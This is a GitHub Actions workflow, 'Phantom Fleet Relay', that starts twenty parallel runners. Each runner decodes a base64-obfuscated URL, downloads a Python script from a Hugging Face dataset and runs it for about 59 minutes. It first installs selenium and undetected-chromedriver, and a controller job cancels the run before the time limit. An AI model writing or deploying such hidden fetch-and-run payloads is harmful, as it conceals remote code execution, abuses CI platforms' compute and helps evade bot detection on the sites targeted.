name: Phantom Fleet Relay

on:
  workflow_dispatch:

concurrency:
  group: phantom-relay-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Fleet Controller: مراقب الوقت لإنهاء الجلسة
  # =================================================================
  fleet-controller:
    name: "Controller Center"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      HOLD_TIME: 3540
    steps:
      - name: Hold Watch
        run: |
          echo ">> [CONTROLLER] Active Run: ${{ github.run_id }}"
          echo ">> [CONTROLLER] Holding session for ${HOLD_TIME}s..."

          sleep ${HOLD_TIME}

          echo ">> [CONTROLLER] Time limit reached. Dispatched abort command."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

  # =================================================================
  # Worker Nodes: التشغيل الموازي للمصفوفة
  # =================================================================
  phantom-nodes:
    name: "Node-Unit-${{ matrix.node_id }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_id: [501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520]

    steps:
      # مرحلة دمج التهيئة والتحميل والتبعيات في خطوة واحدة لتسريع الأداء
      - name: Bootstrap Environment & Dependencies
        run: |
          echo "[BOOTSTRAP] Preparing Node-Unit-${{ matrix.node_id }}..."
          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip

          echo "[BOOTSTRAP] Resolving and fetching worker payload..."
          SRC_URI=$(openssl enc -d -base64 <<< "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5")
          curl -sL "$SRC_URI" -o worker_task.py

          echo "[BOOTSTRAP] Installing Python requirements..."
          pip3 install -q psutil requests selenium undetected-chromedriver

      # مرحلة التنفيذ والتحكم في دورة الحياة
      - name: Execute Worker Task
        run: |
          echo "[EXECUTE] Launching payload for Node-Unit-${{ matrix.node_id }}..."

          python3 worker_task.py &
          WORKER_PID=$!

          echo "[EXECUTE] Worker running with PID: $WORKER_PID. Starting 59m timeout watcher."

          sleep 3540

          if ps -p $WORKER_PID > /dev/null; then
            echo "[EXECUTE] Execution time limit reached. Terminating process $WORKER_PID."
            kill -KILL $WORKER_PID
          else
            echo "[EXECUTE] Process completed successfully prior to limit."
          fi
